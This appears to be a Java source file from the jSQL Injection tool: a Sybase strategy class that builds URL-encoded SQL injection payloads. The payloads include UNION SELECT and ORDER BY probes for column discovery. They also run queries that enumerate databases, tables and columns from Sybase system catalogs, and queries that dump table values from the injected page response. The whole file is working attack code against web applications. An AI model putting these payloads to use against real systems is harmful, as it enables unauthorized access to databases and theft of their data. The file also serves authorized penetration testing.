package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class SybaseStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "select+" +
                "@@version%2B'{%}'%2Bdb_name()%2B'{%}'%2Buser_name()%2B'{%}'%2Bsuser_name()" +
            "%2B'%01%03%03%07'r";
    }

    @Override
    public String getSchemaList() {
        return
            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
            "from(select+distinct++name+from+master..sysdatabases)t,(select+distinct+name+from+master..sysdatabases)t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
            "from(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t,(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
            "from(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t,(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t1+" +
            "where+t.name>=t1.name+" +
            "group+by+t.name{limit})a";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        formatListColumn = formatListColumn.replace("{%}", "%2b'')))%2b'%7f'%2brtrim(ltrim(convert(varchar,");
        
        formatListColumn = "rtrim(ltrim(convert(varchar," + formatListColumn + "%2b'')))";

        return
            "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.s%2b'%050%04'rr+" +
            "from(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+t.s{limit})a";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return "select'SQLi'%2bsubstring(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
    }

    @Override
    public String getIndicesCapacity(String[] indexes) {
        return
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select'SQLi$1'%2breplicate('%23',1024)%2b'iLQS')"
            );
    }

    @Override
    public String getIndices(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select+convert(varchar,(1337"+ i +"7330%2b1))a";
        }
        return "+union+select" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from(" + replaceTag + ")b+";
    }

    @Override
    public String getOrderBy() {
        return "+order+by+1337+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
    
    @Override
    public String getDbLabel() {
        return "Sybase";
    }
}